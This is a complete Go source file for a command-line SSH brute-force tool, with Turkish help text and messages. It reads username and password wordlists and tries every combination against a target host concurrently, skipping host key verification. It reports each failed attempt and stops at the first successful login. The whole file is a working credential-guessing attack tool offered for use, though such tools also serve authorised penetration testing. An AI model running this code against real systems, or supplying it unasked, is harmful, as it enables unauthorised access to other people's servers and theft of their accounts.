package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Job struct {
	Username string
	Password string
}

var found int32

func main() {
	params := os.Args[1:]
	if len(params) == 0 {
		fmt.Println("Selam! Hiç parametre vermedin. Yardım için lütfen '-help' parametresini kullan!")
		os.Exit(1)
	}

	for _, p := range params {
		if p == "-help" {
			showHelp()
			os.Exit(0)
		}
	}

	var singlePassword, singleUser, target string
	var passwordFile, userFile string

	for i := 0; i < len(params); i++ {
		switch params[i] {
		case "-p":
			singlePassword = getParam(params, &i)
		case "-P":
			passwordFile = getParam(params, &i)
		case "-u":
			singleUser = getParam(params, &i)
		case "-U":
			userFile = getParam(params, &i)
		case "-h":
			target = getParam(params, &i)
		default:
			fmt.Printf("Bilinmeyen parametre: %s. Yardım için '-help' kullanabilirsin.\n", params[i])
		}
	}

	if singlePassword == "" && passwordFile == "" {
		fmt.Println("Üzgünüm, şifre belirtimi eksik. Lütfen '-p' veya '-P' parametresini kullan!")
		os.Exit(1)
	}
	if singleUser == "" && userFile == "" {
		fmt.Println("Üzgünüm, kullanıcı belirtimi eksik. Lütfen '-u' veya '-U' parametresini kullan!")
		os.Exit(1)
	}
	if target == "" {
		fmt.Println("Üzgünüm, hedef makine belirtilmemiş. Lütfen '-h' parametresini kullan!")
		os.Exit(1)
	}

	passwords := loadWordlist(singlePassword, passwordFile)
	users := loadWordlist(singleUser, userFile)

	jobs := make(chan Job, len(users)*len(passwords))
	for _, user := range users {
		for _, pass := range passwords {
			jobs <- Job{Username: user, Password: pass}
		}
	}
	close(jobs)

	numWorkers := runtime.NumCPU() * 2
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(target, jobs, &wg)
	}

	wg.Wait()

	if atomic.LoadInt32(&found) == 0 {
		fmt.Println("Üzgünüm, brute force denemeleri sonuçsuz kaldı. Uygun kimlik bilgilerini bulamadık.")
	}
}

func showHelp() {
	fmt.Println("========================================")
	fmt.Println("         SSH Brute Force Aracı")
	fmt.Println("========================================")
	fmt.Println("Bu araç, belirttiğiniz kullanıcı adı ve şifre kombinasyonları ile")
	fmt.Println("hedef SSH makinesine bağlanmayı denemek için tasarlanmıştır.")
	fmt.Println("")
	fmt.Println("Kullanım:")
	fmt.Println("  go run main.go [parametreler]")
	fmt.Println("")
	fmt.Println("Parametreler:")
	fmt.Println("  -p <şifre>                : Tek bir şifre belirtmek için kullanılır.")
	fmt.Println("  -P <şifre_dosyası>         : Şifrelerin bulunduğu wordlist dosyasının yolunu belirtir.")
	fmt.Println("  -u <kullanıcı>            : Tek bir kullanıcı adı belirtmek için kullanılır.")
	fmt.Println("  -U <kullanıcı_dosyası>     : Kullanıcı adlarının bulunduğu wordlist dosyasının yolunu belirtir.")
	fmt.Println("  -h <hedef>                : Hedef makinenin IP adresi veya hostname'ini belirtir.")
	fmt.Println("  -help                    : Bu yardım mesajını gösterir.")
	fmt.Println("")
	fmt.Println("Not:")
	fmt.Println("  Şifre ve kullanıcı belirtimleri için ya tek bir değer ya da bir wordlist dosyası sağlamalısınız.")
	fmt.Println("")
	fmt.Println("Örnek Kullanım:")
	fmt.Println("  go run main.go -p admin -u admin -h 192.168.1.100")
	fmt.Println("  go run main.go -P /path/to/passwords.txt -U /path/to/users.txt -h example.com")
	fmt.Println("")
	fmt.Println("Bol şans!")
}

func getParam(params []string, i *int) string {
	if *i+1 >= len(params) {
		fmt.Printf("Hata: %s parametresi için değer belirtilmedi.\n", params[*i])
		os.Exit(1)
	}
	val := params[*i+1]
	*i++
	return val
}

func loadWordlist(single string, file string) []string {
	var list []string
	if single != "" {
		list = append(list, single)
	}
	if file != "" {
		lines, err := readWordlist(file)
		if err != nil {
			fmt.Printf("Hata: %s dosyası okunamadı: %v\n", file, err)
			os.Exit(1)
		}
		list = append(list, lines...)
	}
	return list
}

func worker(target string, jobs <-chan Job, wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range jobs {
		if atomic.LoadInt32(&found) == 1 {
			return
		}
		if attemptSSH(target, job.Username, job.Password) {
			atomic.StoreInt32(&found, 1)
			return
		}
	}
}

func attemptSSH(target, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	addr := ensurePort(target)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		if os.IsTimeout(err) {
			fmt.Printf("[!] Zaman aşımına uğradık: %s / %s\n", username, password)
		} else if strings.Contains(err.Error(), "handshake failed") {
			fmt.Printf("[!] Yanlış bilgiler: %s / %s\n", username, password)
		} else {
			fmt.Printf("[!] SSH bağlantı hatası: %s / %s - %v\n", username, password, err)
		}
		return false
	}

	fmt.Printf("Harika! Başarılı giriş: %s / %s\n", username, password)
	client.Close()
	return true
}

func readWordlist(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func ensurePort(target string) string {
	if _, _, err := net.SplitHostPort(target); err != nil {
		return target + ":22"
	}
	return target
}
